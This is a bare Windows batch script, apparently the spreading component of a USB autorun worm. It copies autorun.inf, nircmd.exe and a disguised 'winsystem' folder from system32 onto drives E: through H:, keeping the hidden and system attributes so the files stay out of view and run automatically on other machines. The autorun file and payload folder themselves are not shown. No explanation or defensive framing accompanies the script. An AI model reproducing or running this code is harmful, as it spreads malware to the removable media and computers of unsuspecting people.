@echo off
cd\
cd %windir%\system32
xcopy /y /c /h /k /r autorun.inf e:
xcopy /y /c /h /k /r nircmd.exe e:
xcopy /y /c /h /k /r /i winsystem e:\winsystem
xcopy /y /c /h /k /r autorun.inf f:
xcopy /y /c /h /k /r nircmd.exe f:
xcopy /y /c /h /k /r /i winsystem f:\winsystem
xcopy /y /c /h /k /r autorun.inf g:
xcopy /y /c /h /k /r nircmd.exe g:
xcopy /y /c /h /k /r /i winsystem g:\winsystem
xcopy /y /c /h /k /r autorun.inf h:
xcopy /y /c /h /k /r nircmd.exe h:
xcopy /y /c /h /k /r /i winsystem h:\winsystem
exit
